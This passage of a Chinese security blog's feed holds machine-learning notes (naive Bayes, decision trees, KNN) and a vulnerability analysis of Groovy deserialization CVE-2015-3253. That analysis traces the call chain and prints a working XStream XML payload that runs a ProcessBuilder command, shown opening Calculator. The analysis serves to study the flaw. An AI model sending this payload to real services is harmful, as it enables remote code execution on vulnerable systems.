<p>利用贝叶斯分类器对文档进行分类时，要计算多个概率的乘积以获得文档属于某个类别的概率，即计算p(w0|1)p(w1|1)p(w2|1)。如果其中一个概率值为0，那么最后的乘积也为0。为降低 这种影响，可以将所有词的出现数初始化为1，并将分母初始化为2</p>

<pre><code class="language-text">p0Denom = 2.0
p1Denom = 2.0
</code></pre>

<ul>
<li>下溢出问题</li>
</ul>

<p>相乘许多很小的数，最后四舍五入后会得到0</p>

<p><code>p(w0|ci)*p(w1|ci)*...*p(w0|ci)</code> 取对数，得到<code>ln(p(w0|ci))+ln(p(w1|ci))+...+ln(p(w0|ci))</code></p>

<pre><code class="language-text">p1Vect = log(p1Num/p1Denom)         
p0Vect = log(p0Num/p0Denom)
</code></pre>

<p><strong>测试算法</strong></p>

<p><img src="media/15371914791159/15372632355434.jpg" alt=""/></p>

<p><img src="media/15371914791159/15372632623577.jpg" alt=""/><br/>
的含义为给定w向量的基础上来自类别ci的概率是多少</p>

<p>p(ci)的概率为<code>pAbusive</code><br/>
接下来需要计算p(w|ci)，假设所有词都互相独立，即<br/>
<code>p(w0,w1,w2..wN|ci)=p(w0|ci)p(w1|ci)p(w2|ci)...p(wN|ci)</code></p>

<p>因为P(w)P(ci)两者是一样的，可以忽略</p>

<p>因为<code>log(p(w|c)p(c)) = log(p(w|c)) + log(p(c))</code>，所以在classifyNB方法中求和</p>

<pre><code class="language-text">def classifyNB(vec2Classify, p0Vec, p1Vec, pClass1):
    &#39;&#39;&#39;
    元素相乘
    :param vec2Classify:要分类的向量
    :param p0Vec:正常文档概率向量
    :param p1Vec:侮辱文档概率向量
    :param pClass1:侮辱文档的概率
    :return:1 or 0
    &#39;&#39;&#39;
    p1 = sum(vec2Classify * p1Vec) + log(pClass1)
    p0 = sum(vec2Classify * p0Vec) + log(1.0 - pClass1)
    if p1 &gt; p0:
        return 1
    else: 
        return 0
</code></pre>

<p><strong>便利函数</strong></p>

<pre><code class="language-text">def testingNB():
    listOPosts,listClasses = loadDataSet()
    myVocabList = createVocabList(listOPosts)
    trainMat=[]
    for postinDoc in listOPosts:
        trainMat.append(setOfWords2Vec(myVocabList, postinDoc))
    p0V,p1V,pAb = trainNB0(array(trainMat), array(listClasses))
    testEntry = [&#39;love&#39;, &#39;my&#39;, &#39;dalmation&#39;]
    thisDoc = array(setOfWords2Vec(myVocabList, testEntry))
    print(testEntry, &#39;classified as: &#39;, classifyNB(thisDoc, p0V, p1V, pAb))
    testEntry = [&#39;stupid&#39;, &#39;garbage&#39;]
    thisDoc = array(setOfWords2Vec(myVocabList, testEntry))
    print(testEntry, &#39;classified as: &#39;, classifyNB(thisDoc, p0V, p1V, pAb))
</code></pre>

<p><img src="media/15371914791159/15372709062992.jpg" alt=""/></p>

<ul>
<li>词袋模型</li>
</ul>

<p>在词袋中，每个单词可以出现 多次，而在词集中，每个词只能出现一次</p>

<p>每当遇到一个单词时，词向量中的对应值会+1</p>

<pre><code class="language-text">def bagOfWords2VecMN(vocabList, inputSet):
    returnVec = [0]*len(vocabList)
    for word in inputSet:
        if word in vocabList:
            returnVec[vocabList.index(word)] += 1
    return returnVec
</code></pre>

<h4 id="toc_3">0x04 Action 1</h4>

<p>垃圾邮件判断</p>

<pre><code class="language-text">def textParse(bigString):
    &#39;&#39;&#39;
    简单分词处理
    :param bigString: 
    :return: 
    &#39;&#39;&#39;
    import re
    listOfTokens = re.split(&#39;\W*&#39;, bigString)
    return [tok.lower() for tok in listOfTokens if len(tok) &gt; 2] #取长度大于3，转化为小写
    
def spamTest():
    &#39;&#39;&#39;
    数据输入
    处理
    分割
    训练
    测试
    :return: 
    &#39;&#39;&#39;
    docList=[]
    classList = []
    fullText = []
    for i in range(1, 26):
        wordList = textParse(open(&#39;email/spam/%d.txt&#39; % i, &#39;rb&#39;).read().decode(&#39;GBK&#39;, &#39;ignore&#39;))
        docList.append(wordList)
        fullText.extend(wordList)
        classList.append(1)
        wordList = textParse(open(&#39;email/ham/%d.txt&#39; % i, &#39;rb&#39;).read().decode(&#39;GBK&#39;, &#39;ignore&#39;))
        docList.append(wordList)
        fullText.extend(wordList)
        classList.append(0)
    vocabList = createVocabList(docList) #创建不重复词表
    trainingSet = list(range(50)) #[0, 1, 2, 3, 4, 5, 6, 7, 8...44, 45, 46, 47, 48, 49]
    testSet=[]
    for i in range(10): #随机选择10条数据作为测试集
        randIndex = int(random.uniform(0, len(trainingSet)))
        testSet.append(trainingSet[randIndex])
        del(trainingSet[randIndex])  
    trainMat = []
    trainClasses = []
    for docIndex in trainingSet: # 训练集
        trainMat.append(bagOfWords2VecMN(vocabList, docList[docIndex])) #词袋模型，构建词向量
        trainClasses.append(classList[docIndex])
    p0V, p1V, pSpam = trainNB0(array(trainMat), array(trainClasses))
    errorCount = 0
    for docIndex in testSet: # 测试集
        wordVector = bagOfWords2VecMN(vocabList, docList[docIndex])
        if classifyNB(array(wordVector), p0V, p1V, pSpam) != classList[docIndex]:
            errorCount += 1
            print(&quot;classification error&quot;, docList[docIndex])
    print(&#39;the error rate is: &#39;, float(errorCount)/len(testSet))
</code></pre>

<hr/>

<p><strong>参考</strong></p>

<p>[1] <a href="https://www.manning.com/books/machine-learning-in-action">https://www.manning.com/books/machine-learning-in-action</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]Decision Tree（DT）]]></title>
    <link href="https://www.uxss.net/15367537328088.html"/>
    <updated>2018-09-12T20:02:12+08:00</updated>
    <id>https://www.uxss.net/15367537328088.html</id>
    <content type="html"><![CDATA[
<p>分类算法</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 DT</h4>

<p>分类算法</p>

<p>优点</p>

<ul>
<li>计算复杂度不高</li>
<li>输出结果易于理解</li>
<li>中间值缺失不敏感</li>
<li>可处理不相关特征</li>
</ul>

<p>缺点</p>

<ul>
<li>可能会产生过度匹配问题</li>
</ul>

<p>适用数据类型：</p>

<ul>
<li>数值型</li>
<li>标称型</li>
</ul>

<h4 id="toc_1">0x02 准备数据</h4>

<p><strong>算法描述</strong></p>

<pre><code class="language-text">1.根节点开始，测试待分类项中相应的特征属性

2.按照其值选择输出分支，直到到达叶子节点

3.将叶子节点存放的类别作为决策结果
</code></pre>

<ul>
<li>划分数据集</li>
</ul>

<p>将无序的数据变得更加有序</p>

<p><code>信息增益</code>：划分数据集之后信息发生的变化<br/>
<code>熵</code>：信息的期望值</p>

<ul>
<li>熵计算公式</li>
</ul>

<p><img src="media/15367537328088/15367568995606.jpg" alt=""/></p>

<pre><code class="language-text">def calcShannonEnt(dataSet):
    numEntries = len(dataSet) #计算数据集中实例总数
    labelCounts = {}
    #统计每个键值的数量，dict
    for featVec in dataSet:
        currentLabel = featVec[-1]
        if currentLabel not in labelCounts.keys():
            labelCounts[currentLabel] = 0
        labelCounts[currentLabel] += 1
    shannonEnt = 0.0
    #计算香农熵
    for key in labelCounts:
        prob = float(labelCounts[key])/numEntries
        shannonEnt -= prob * log(prob, 2)
    return shannonEnt
</code></pre>

<p><img src="media/15367537328088/15367570540472.jpg" alt=""/></p>

<ul>
<li>划分数据集</li>
</ul>

<p><strong>按照给定特征划分数据集</strong></p>

<pre><code class="language-text">def splitDataSet(dataSet, axis, value):
    &#39;&#39;&#39;
    
    :param dataSet: 待划分数据集
    :param axis: 特征
    :param value: 特征值
    :return: 符合条件的值列表
    &#39;&#39;&#39;
    retDataSet = []
    for featVec in dataSet:
        if featVec[axis] == value:
            reducedFeatVec = featVec[:axis]     
            reducedFeatVec.extend(featVec[axis+1:]) #把特征列除去
            retDataSet.append(reducedFeatVec)
    return retDataSet
</code></pre>

<p><strong>选择最好的数据集划分方式</strong></p>

<p>熵越高，则混合的数据就越多</p>

<pre><code class="language-text">def chooseBestFeatureToSplit(dataSet):
    &#39;&#39;&#39;
    :param dataSet: 数据集
    :return:
    &#39;&#39;&#39;
    numFeatures = len(dataSet[0]) - 1      #特征列的长度，-1为label
    baseEntropy = calcShannonEnt(dataSet)  #计算数据集的香农熵
    bestInfoGain = 0.0
    bestFeature = -1
    for i in range(numFeatures):
        featList = [example[i] for example in dataSet] #创建一个list包含所有数据的第i个feature
        uniqueVals = set(featList)       #转变为set格式
        newEntropy = 0.0
        for value in uniqueVals:
            subDataSet = splitDataSet(dataSet, i, value) #遍历featList中的所有feature，对每个feture划分一次数据集
            prob = len(subDataSet)/float(len(dataSet))
            newEntropy += prob * calcShannonEnt(subDataSet)  #计算当前feature的香农熵
        infoGain = baseEntropy - newEntropy     #计算熵差，信息增益
        if (infoGain &gt; bestInfoGain): #计算最大信息增益
            bestInfoGain = infoGain
            bestFeature = i
    return bestFeature                      #返回最好的feature
</code></pre>

<p><strong>递归构建决策树</strong></p>

<p>1.得到数据集<br/>
2.最好feature划分<br/>
3.递归划分</p>

<p>当处理了所有feature后，类标签仍然不唯一时，采用多数表决方式决定子节点分类</p>

<pre><code class="language-text">def majorityCnt(classList):
    classCount={}
    for vote in classList:
        if vote not in classCount.keys():
            classCount[vote] = 0
        classCount[vote] += 1
    sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True)
    return sortedClassCount[0][0]
</code></pre>

<p>利用递归构建tree</p>

<pre><code class="language-text">def createTree(dataSet,labels):
    classList = [example[-1] for example in dataSet] #数据集的所有类标签
    if classList.count(classList[0]) == len(classList): 
        return classList[0] #当类标签完全相同返回该类标签
    if len(dataSet[0]) == 1: #当所有属性都处理完，label仍然不唯一时，采用表决方式
        return majorityCnt(classList)
    bestFeat = chooseBestFeatureToSplit(dataSet)
    bestFeatLabel = labels[bestFeat] #当前数据集选取的最好特征变量
    myTree = {bestFeatLabel: {}}
    del(labels[bestFeat]) #删除用过的feature
    featValues = [example[bestFeat] for example in dataSet]
    uniqueVals = set(featValues)
    for value in uniqueVals: 
        subLabels = labels[:]
        myTree[bestFeatLabel][value] = createTree(splitDataSet(dataSet, bestFeat, value), subLabels) #利用递归构建tree
    return myTree  
</code></pre>

<ul>
<li>绘制树形图</li>
</ul>

<p>利用Matplotlib annotations实现绘制树形图</p>

<p>实现效果如下图</p>

<p><img src="media/15367537328088/15370834199165.jpg" alt=""/></p>

<h4 id="toc_2">0x03 测试和储存分类器</h4>

<ul>
<li>将标签字符串转换为索引</li>
</ul>

<pre><code class="language-text">def classify(inputTree,featLabels,testVec):
    &#39;&#39;&#39;

    :param inputTree: tree dict
    :param featLabels: labels
    :param testVec: 位置,eg.[1, 0]
    :return:
    &#39;&#39;&#39;
    firstStr = list(inputTree.keys())[0]
    secondDict = inputTree[firstStr]
    featIndex = featLabels.index(firstStr)
    key = testVec[featIndex]
    valueOfFeat = secondDict[key]
    if isinstance(valueOfFeat, dict): 
        classLabel = classify(valueOfFeat, featLabels, testVec)
    else:
        classLabel = valueOfFeat
    return classLabel
</code></pre>

<ul>
<li>存储决策树</li>
</ul>

<p>使用pickle持久化对象</p>

<p><code>pickle.dump(obj, file[, protocol])</code></p>

<pre><code class="language-text">def storeTree(inputTree, filename):
    import pickle
    fw = open(filename, &#39;wb&#39;)
    pickle.dump(inputTree, fw)
    fw.close()
    
def grabTree(filename):
    import pickle
    fr = open(filename, &#39;rb&#39;)
    return pickle.load(fr)
</code></pre>

<h4 id="toc_3">0x04 使用决策树预测隐形眼镜类型</h4>

<ul>
<li>收集数据</li>
</ul>

<p><a href="http://archive.ics.uci.edu/ml/machine-learning-databases/lenses/">lenses</a></p>

<ul>
<li>准备数据</li>
</ul>

<p>解析通过&#39;\t&#39;分隔的数据</p>

<p><img src="media/15367537328088/15370863087583.jpg" alt=""/></p>

<p><img src="media/15367537328088/15370863188621.jpg" alt=""/></p>

<ul>
<li>分析数据&amp;训练模型</li>
</ul>

<pre><code class="language-text">labels = [&#39;age&#39;, &#39;prescript&#39;, &#39;astigmatic&#39;, &#39;tearRate&#39;]
lenses_tree = createTree(lenses, labels)
</code></pre>

<p><img src="media/15367537328088/15370866231411.jpg" alt=""/></p>

<p><img src="media/15367537328088/15370866007025.jpg" alt=""/></p>

<ul>
<li>测试模型</li>
</ul>

<p><img src="media/15367537328088/15370873991863.jpg" alt=""/></p>

<p><img src="media/15367537328088/15370875259893.jpg" alt=""/></p>

<h4 id="toc_4">0x05 其它模型</h4>

<ul>
<li><p>ID3（分类树）</p>
<p>每次根据“最大信息熵增益”选取当前最佳的特征来分割数据，并按照该特征的所有取值来切分</p></li>
<li><p>C4.5（分类树）</p>
<p>ID3的升级版，采用信息增益比率，通过引入一个被称作分裂信息(Split information)的项来惩罚取值较多的Feature<br/>
弥补了ID3中不能处理特征属性值连续的问题</p></li>
<li><p>CART（分类回归树）</p>
<p>CART是一棵二叉树，采用二元切分法，每次把数据切成两份，分别进入左子树、右子树。而且每个非叶子节点都有两个孩子，所以CART的叶子节点比非叶子多1</p></li>
</ul>

<h4 id="toc_5">0x05 安全领域</h4>

<ul>
<li>分析恶意网络攻击和入侵</li>
<li>口令爆破检测</li>
<li>僵尸流量检测</li>
</ul>

<hr/>

<p><strong>参考</strong></p>

<p>[1] <a href="https://www.manning.com/books/machine-learning-in-action">https://www.manning.com/books/machine-learning-in-action</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]K Nearest Neighbor（KNN）]]></title>
    <link href="https://www.uxss.net/15366674308314.html"/>
    <updated>2018-09-11T20:03:50+08:00</updated>
    <id>https://www.uxss.net/15366674308314.html</id>
    <content type="html"><![CDATA[
<p>采用测量不同特征值之间的距离进行分类</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 KNN</h4>

<p>采用测量不同特征值之间的距离进行分类</p>

<!-- more -->

<p>优点：</p>

<ul>
<li>精度高</li>
<li>对异常值不敏感</li>
<li>无数据输入假定</li>
</ul>

<p>缺点：</p>

<ul>
<li>计算复杂度高</li>
<li>空间复杂度高</li>
</ul>

<p>适用数据范围：</p>

<ul>
<li>数值型</li>
<li>标称型</li>
</ul>

<h4 id="toc_1">0x02 算法实现</h4>

<p><strong>算法描述</strong></p>

<ul>
<li><p>1.计算测试数据与各个训练数据之间的距离</p></li>
<li><p>2.按照距离的递增关系进行排序</p></li>
<li><p>3.选取距离最小的K个点</p></li>
<li><p>4.确定前K个点所在类别的出现频率</p></li>
<li><p>5.返回前K个点中出现频率最高的类别作为测试数据的预测分类</p></li>
</ul>

<pre><code class="language-text">def classify0(inX, dataSet, labels, k):
    &#39;&#39;&#39;

    :param inX: 输入向量
    :param dataSet: 训练数据集
    :param labels: 标签
    :param k: k
    :return:
    &#39;&#39;&#39;
    #距离计算
    dataSetSize = dataSet.shape[0] #读取矩阵第一维度的长度
    diffMat = tile(inX, (dataSetSize, 1)) - dataSet #tile把inX复制dataSetSize维度
    sqDiffMat = diffMat**2
    sqDistances = sqDiffMat.sum(axis=1)
    distances = sqDistances**0.5
    #选择距离最小的k个点
    sortedDistIndicies = distances.argsort()
    print(sortedDistIndicies)
    classCount={}
    for i in range(k):
        voteIlabel = labels[sortedDistIndicies[i]]
        classCount[voteIlabel] = classCount.get(voteIlabel, 0) + 1
    #排序
    sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True)
    return sortedClassCount[0][0]
</code></pre>

<p><img src="media/15366674308314/15366780712525.jpg" alt=""/></p>

<h4 id="toc_2">0x03 实例1</h4>

<ul>
<li>收集数据</li>
</ul>

<p><img src="media/15366674308314/15366784508012.jpg" alt=""/></p>

<ul>
<li>准备数据</li>
</ul>

<pre><code class="language-text">def file2matrix(filename):
    with open(filename, &quot;r&quot;) as fr:
        frreadlines = fr.readlines()
        numberOfLines = len(frreadlines)
        returnMat = zeros((numberOfLines, 3))
        classLabelVector = []
        index = 0
        for line in frreadlines:
            line = line.strip()
            listFromLine = line.split(&#39;\t&#39;)
            returnMat[index, :] = listFromLine[0:3]
            labels = {&#39;didntLike&#39;: 1, &#39;smallDoses&#39;: 2, &#39;largeDoses&#39;: 3}
            classLabelVector.append(labels[listFromLine[-1]])
            index += 1
        return returnMat, classLabelVector
</code></pre>

<p><img src="media/15366674308314/15366798028789.jpg" alt=""/></p>

<ul>
<li>分析数据</li>
</ul>

<pre><code class="language-text">def DataMat(data, labels):
    fig = plt.figure()
    ax = fig.add_subplot(111)
    ax.scatter(data[:, 0], data[:, 1], 15.0*array(labels), 15.0*array(labels))
    plt.show()
</code></pre>

<p><img src="media/15366674308314/15366804644367.jpg" alt=""/></p>

<ul>
<li>处理数据</li>
</ul>

<p>归一化数值，转化到0~1之间</p>

<p><code>newV = (oldV-min)/(max-min)</code></p>

<pre><code class="language-text">def autoNorm(dataSet):
    minVals = dataSet.min(0)
    maxVals = dataSet.max(0)
    ranges = maxVals - minVals
    m = dataSet.shape[0]
    normDataSet = dataSet - tile(minVals, (m, 1))
    normDataSet = normDataSet/tile(ranges, (m, 1))
    return normDataSet, ranges, minVals
</code></pre>

<p><img src="media/15366674308314/15366812840237.jpg" alt=""/></p>

<ul>
<li>测试算法</li>
</ul>

<p>对hoRatio和k进行参数调整，寻找最佳值</p>

<pre><code class="language-text">def testData(data_mat, data_label):
    hoRatio = 0.80 #内变量
    normDataSet, ranges, minVals = autoNorm(data_mat)
    m = normDataSet.shape[0]
    numTestVecs = int(m * hoRatio)
    trueCount = 0.0
    for i in range(numTestVecs):
        classifierResult = classify0(normDataSet[i, :], normDataSet[numTestVecs:m, :], data_label[numTestVecs:m], 5)
        if (classifierResult == data_label[i]):
            trueCount += 1.0
    print(&quot;the total true rate is: %f&quot; % (trueCount/float(numTestVecs)*100) + &quot;%&quot;)
    print(trueCount)
</code></pre>

<p><img src="media/15366674308314/15366824971011.jpg" alt=""/></p>

<ul>
<li>使用算法</li>
</ul>

<pre><code class="language-text">def usemode(a, b, c):
    file_path = &quot;datingTestSet.txt&quot;
    data_mat, data_label = file2matrix(file_path)
    normDataSet, ranges, minVals = autoNorm(data_mat)
    inarr = array([a, b, c])
    classifierResult = classify0((inarr-minVals)/ranges, normDataSet, data_label, 5)
    return classifierResult
</code></pre>

<pre><code class="language-text">result = usemode(40920, 8.326976, 0.953952)
</code></pre>

<p><code>(inarr-minVals)/ranges</code>是传入参数归一化后的结果，代入classify0模型，求出与历史数据中的临近值，即结果</p>

<h4 id="toc_3">0x04 实例2</h4>

<p>手写数字识别</p>

<p><img src="media/15366674308314/15367314254091.jpg" alt=""/></p>

<pre><code class="language-text">def img2vector(filename):
    returnVect = zeros((1,1024))
    fr = open(filename)
    for i in range(32):
        lineStr = fr.readline()
        for j in range(32):
            returnVect[0, 32*i+j] = int(lineStr[j])
    return returnVect

def handwritingClassTest():
    hwLabels = []
    trainingFileList = listdir(&#39;digits/trainingDigits&#39;)
    m = len(trainingFileList)
    trainingMat = zeros((m, 1024))
    for i in range(m):
        #从文件名上解析当前文件中的正确值，存入label
        fileNameStr = trainingFileList[i]
        fileStr = fileNameStr.split(&#39;.&#39;)[0]
        classNumStr = int(fileStr.split(&#39;_&#39;)[0])
        hwLabels.append(classNumStr)
        trainingMat[i, :] = img2vector(&#39;digits/trainingDigits/%s&#39; % fileNameStr)
    testFileList = listdir(&#39;digits/testDigits&#39;)
    trueCount = 0.0
    mTest = len(testFileList)
    for i in range(mTest):
        fileNameStr = testFileList[i]
        fileStr = fileNameStr.split(&#39;.&#39;)[0]
        classNumStr = int(fileStr.split(&#39;_&#39;)[0])
        vectorUnderTest = img2vector(&#39;digits/testDigits/%s&#39; % fileNameStr)
        classifierResult = classify0(vectorUnderTest, trainingMat, hwLabels, 3)
        if (classifierResult == classNumStr): trueCount += 1.0
    print(&quot;\nthe total true rate is: %f&quot; % (trueCount/float(mTest)))
</code></pre>

<p><img src="media/15366674308314/15367319690071.jpg" alt=""/></p>

<h4 id="toc_4">0x05 安全应用</h4>

<p>从数学角度来看，异常行为检测也是对被检测的未知行为进行分类的过程，未知行为与已知的正常行为相似，则该行为是正常行为，否则是入侵行为[1]</p>

<p><img src="media/15366674308314/15367429422892.jpg" alt=""/></p>

<p>还有像<code>恶意软件检测</code>等安全领域应用</p>

<h4 id="toc_5">0x06 其他应用</h4>

<ul>
<li>文字识别</li>
<li>人脸识别</li>
<li>医用图像处理</li>
</ul>

<p>参考：[1]<a href="http://read.pudn.com/downloads116/ebook/489656/KNN.pdf">基于 kNN 算法的异常行为检测方法研究</a></p>

<hr/>

<p><strong>参考</strong></p>

<p>[1]<a href="https://www.manning.com/books/machine-learning-in-action">https://www.manning.com/books/machine-learning-in-action</a><br/>
[2]<a href="http://read.pudn.com/downloads116/ebook/489656/KNN.pdf">基于 kNN 算法的异常行为检测方法研究</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[机器学习笔记]Security & Data]]></title>
    <link href="https://www.uxss.net/15353734074107.html"/>
    <updated>2018-08-27T20:36:47+08:00</updated>
    <id>https://www.uxss.net/15353734074107.html</id>
    <content type="html"><![CDATA[
<p>拾人牙慧，安全数据分析</p>

<span id="more"></span><!-- more -->

<p><img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8701.png" alt="幻灯片01"/></p>

<p><img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8702.png" alt="幻灯片02"/><br/>
<img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8703.png" alt="幻灯片03"/><br/>
<img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8704.png" alt="幻灯片04"/><br/>
<img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8705.png" alt="幻灯片05"/><br/>
<img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8706.png" alt="幻灯片06"/><br/>
<img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8707.png" alt="幻灯片07"/><br/>
<img src="media/15353734074107/%E5%B9%BB%E7%81%AF%E7%89%8708.png" alt="幻灯片08"/></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[漏洞分析]Groovy Deserialization（groovy.util.Expando）]]></title>
    <link href="https://www.uxss.net/15295824918778.html"/>
    <updated>2018-06-21T20:01:31+08:00</updated>
    <id>https://www.uxss.net/15295824918778.html</id>
    <content type="html"><![CDATA[
<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3253</a></p>

<p>影响版本（1.7.0~2.4.3）</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">调用链分析</h4>

<p><strong>MethodClosure</strong></p>

<pre><code class="language-text">public class MethodClosure extends Closure {
    private String method;

    public MethodClosure(Object owner, String method) {
        super(owner);
        this.method = method;
        Class clazz = owner.getClass() == Class.class ? (Class)owner : owner.getClass();
        this.maximumNumberOfParameters = 0;
        this.parameterTypes = new Class[0];
        List&lt;MetaMethod&gt; methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method);
        Iterator i$ = methods.iterator();

        while(i$.hasNext()) {
            MetaMethod m = (MetaMethod)i$.next();
            if (m.getParameterTypes().length &gt; this.maximumNumberOfParameters) {
                Class[] pt = m.getNativeParameterTypes();
                this.maximumNumberOfParameters = pt.length;
                this.parameterTypes = pt;
            }
        }

    }

    public String getMethod() {
        return this.method;
    }

    protected Object doCall(Object arguments) {
        return InvokerHelper.invokeMethod(this.getOwner(), this.method, arguments);
    }
</code></pre>

<p>doCall()作用应该是执行构件好的对象（this.getOwner()）的方法（this.method）</p>

<p><strong>invokeMethod</strong></p>

<pre><code class="language-text">    public static Object invokeMethod(Object object, String methodName, Object arguments) {
        if (object == null) {
            object = NullObject.getNullObject();
        }

        if (object instanceof Class) {
            Class theClass = (Class)object;
            MetaClass metaClass = metaRegistry.getMetaClass(theClass);
            return metaClass.invokeStaticMethod(object, methodName, asArray(arguments));
        } else {
            return !(object instanceof GroovyObject) ? invokePojoMethod(object, methodName, arguments) : invokePogoMethod(object, methodName, arguments);
        }
    }
</code></pre>

<p>调用指定对象的指定方法<br/>
所以可以利用这个方法来执行命令</p>

<pre><code class="language-text">MethodClosure mc = new MethodClosure(new java.lang.ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;).call();
</code></pre>

<p>通过java.lang.ProcessBuilder对象的start方法执行open命令</p>

<p>根据上边的分析，<code>MethodClosure.call() == &quot;command&quot;.execute()</code></p>

<p>找到了存在缺陷的方法，接下来就要看有哪些地方调用了这个方法<br/>
断点调试call()可以看到被hashcode()调用了</p>

<pre><code class="language-text">    public int hashCode() {
        Object method = this.getProperties().get(&quot;hashCode&quot;);
        if (method != null &amp;&amp; method instanceof Closure) {
            Closure closure = (Closure)method;
            closure.setDelegate(this);
            Integer ret = (Integer)closure.call();
            return ret.intValue();
        } else {
            return super.hashCode();
        }
    }
</code></pre>

<p>hashCode的功能和特性</p>

<pre><code class="language-text">如果两个对象相同，那么它们的hashCode  值一定要相同
如果两个对象的hashCode相同，它们并不一定相同     
上面说的对象相同指的是用eqauls方法比较
</code></pre>

<p>所以当两个对象进行比较时，会调用hashcode和eqauls，如果结果一致则相等</p>

<pre><code class="language-text">    public V put(K key, V value) {
        if (table == EMPTY_TABLE) {
            inflateTable(threshold);
        }
        if (key == null)
            return putForNullKey(value);
        int hash = hash(key);
        int i = indexFor(hash, table.length);
        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
            Object k;
            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            }
        }

        modCount++;
        addEntry(hash, key, value, i);
        return null;
    }
</code></pre>

<p>put方法是用来向HashMap中添加新的元素，从put方法的具体实现可知，会先调用hashCode方法得到该元素的hashCode值，然后查看table中是否存在该hashCode值，如果存在则调用equals方法重新确定是否存在该元素，如果存在，则更新value值，否则将新的元素添加到HashMap中</p>

<p>所以当把我们构造的代码添加进去时，put就会调用hashcode进行比较，进而执行代码</p>

<pre><code class="language-text">    public void setProperty(String property, Object newValue) {
        this.getProperties().put(property, newValue);
    }
</code></pre>

<p><code>Object method = this.getProperties().get(&quot;hashCode&quot;)</code>自定义hashcode，调用setProperty可以绑定hashcode属性<br/>
closure.call()注定了hashCode必须是Closure或者其子类才能最终调用call函数，MethodClosure类恰好是Closure的子类</p>

<p>然后通过调用hashcode的put方法即可执行构造的代码</p>

<p><img src="media/15295824918778/15307985501989.jpg" alt=""/></p>

<p><strong>poc</strong></p>

<pre><code class="language-text">&lt;map&gt; 
  &lt;entry&gt; 
    &lt;groovy.util.Expando&gt; 
      &lt;expandoProperties&gt; 
        &lt;entry&gt; 
          &lt;string&gt;hashCode&lt;/string&gt; 
          &lt;org.codehaus.groovy.runtime.MethodClosure&gt; 
            &lt;delegate class=&quot;groovy.util.Expando&quot; reference=&quot;../../../..&quot;/&gt; 
            &lt;owner class=&quot;java.lang.ProcessBuilder&quot;&gt; 
              &lt;command&gt; 
                &lt;string&gt;open&lt;/string&gt; 
                &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; 
              &lt;/command&gt; 
              &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; 
            &lt;/owner&gt; 
            &lt;resolveStrategy&gt;0&lt;/resolveStrategy&gt; 
            &lt;directive&gt;0&lt;/directive&gt; 
            &lt;parameterTypes/&gt; 
            &lt;maximumNumberOfParameters&gt;0&lt;/maximumNumberOfParameters&gt; 
            &lt;method&gt;start&lt;/method&gt; 
          &lt;/org.codehaus.groovy.runtime.MethodClosure&gt; 
        &lt;/entry&gt; 
      &lt;/expandoProperties&gt; 
    &lt;/groovy.util.Expando&gt; 
    &lt;int&gt;1&lt;/int&gt; 
  &lt;/entry&gt; 
&lt;/map&gt;
</code></pre>

<p>参考：<br/>
<a href="https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/">https://www.iswin.org/2016/02/27/Xstream-Deserializable-Vulnerablity-And-Groovy-CVE-2015-3253/</a><br/>
<a href="http://avfisher.win/archives/tag/groovy">http://avfisher.win/archives/tag/groovy</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[安全开发]基于token的认证]]></title>
    <link href="https://www.uxss.net/15266370378300.html"/>
    <updated>2018-05-18T17:50:37+08:00</updated>
    <id>https://www.uxss.net/15266370378300.html</id>
    <content type="html"><![CDATA[
<p>说到token就必然绕不开cookie和session。</p>

<span id="more"></span><!-- more -->

<h4 id="toc_0">0x01 cookie/session</h4>

<p>说到token就必然绕不开cookie和session。</p>

<p><strong>cookie</strong>：由服务端给客户端颁发的一张通行证，用来验证客户端的身份，本质上是一段在浏览器上以KV形式存储的文本数据，包含了session相关信息。用于解决HTTP协议无状态的问题，所以cookie是一个会话跟踪机制，是有状态的。 </p>

<p><strong>session</strong>：当客户端请求服务端通过验证后，服务端会生成保存身份认证相关的session数据，并将session相关信息写入cookie返回给客户端，然后客户端将cookie保存到本地。之后两端就通过核对session信息来确认可信状态。session 可能会存储在内存、磁盘、数据库里，可能需要在服务端定期的去清理过期的 session。</p>

<h4 id="toc_1">0x02 token</h4>

<p>既然有了cookie/session为啥还需要token呢   </p>

<p><strong>优点</strong>：</p>

<p>1、无状态、可扩展</p>

<p>2、安全性</p>

<p>3、可扩展性</p>

<p>4、多平台跨域/单点登陆</p>

<p>5、基于标准</p>

<p>6、缓解服务器内存压力/增大服务器计算压力</p>

<p><strong>格式</strong>：</p>

<p><code>UID + TIME + SIGN [+ OTHER]</code></p>

<h4 id="toc_2">0x03 实施</h4>

<p><code>JSON Web Tokens（JWT）</code></p>

<p><strong>组成</strong>：</p>

<ul>
<li>header</li>
</ul>

<p>用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等</p>

<pre><code class="language-javascript">{
